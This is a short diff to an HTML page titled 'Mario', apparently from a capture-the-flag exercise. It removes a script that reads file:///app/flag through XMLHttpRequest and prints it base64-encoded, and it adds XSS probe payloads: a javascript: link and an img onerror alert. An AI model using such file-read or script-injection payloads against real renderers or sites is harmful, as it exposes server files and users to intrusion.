@@ -4,10 +4,12 @@
 <title>Mario</title>
 </head>
 <body>
-<script>
-x=new XMLHttpRequest;
-x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///app/flag");x.send();
-</script>
+<html>
+<head></head>
+<body>
+
+<a href="javascript: alert('clicked xss link')" id="link">click me</a>
+<img src="xx" onerror="alert('xss')" />
 </body>
+</html></body>
 </html>
